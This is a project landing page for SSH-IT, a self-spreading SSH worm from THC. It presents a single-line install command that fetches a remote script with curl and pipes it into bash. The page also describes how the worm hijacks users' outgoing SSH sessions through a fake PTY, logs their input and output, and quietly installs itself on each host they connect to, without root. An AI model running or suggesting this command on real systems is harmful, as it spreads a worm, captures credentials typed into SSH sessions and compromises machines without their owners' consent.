---
layout: default
---

<div style="text-align:center">An autonomous SSH worm</div>

<div style="width:80%; margin:auto">
<script id="asciicast-LNmtdthAM1WewOs12ZnHd8RyC" src="https://asciinema.org/a/LNmtdthAM1WewOs12ZnHd8RyC.js" async data-autoplay=1 data-speed="1.5"></script>
</div>

### Install / Deploy

SSH-IT can be installed and deployed with a [single command](deploy):
```shell
bash -c "$(curl -fsSL ssh-it.thc.org/x)"
```
[Read more](deploy) and learn some [tricks](deploy).

### What it does

SSH-IT intercepts outgoing SSH connections every time a user uses ```ssh```. It logs the session and (secretly) installs itself onto the newly connected system. SSH-IT keeps intercepting, logging and spreading.

### How it works

SSH-IT executes the original ssh command inside a fake PTY harness and intercepts any user input and output. None of the system binaries are modified and it does not need ```ptrace()```. It does not require root or superuser privileges.

Read our [detailed explanation](how-it-works) for more information.

### Contact

Twitter: [https://twitter.com/hackerschoice](https://twitter.com/hackerschoice)  
Telegram: [https://t.me/thcorg](https://t.me/thcorg)  
Web: [https://www.thc.org](https://www.thc.org)  
Medium: [https://medium.com/@hackerschoice](https://medium.com/@hackerschoice)  
E-Mail: members@thc.org  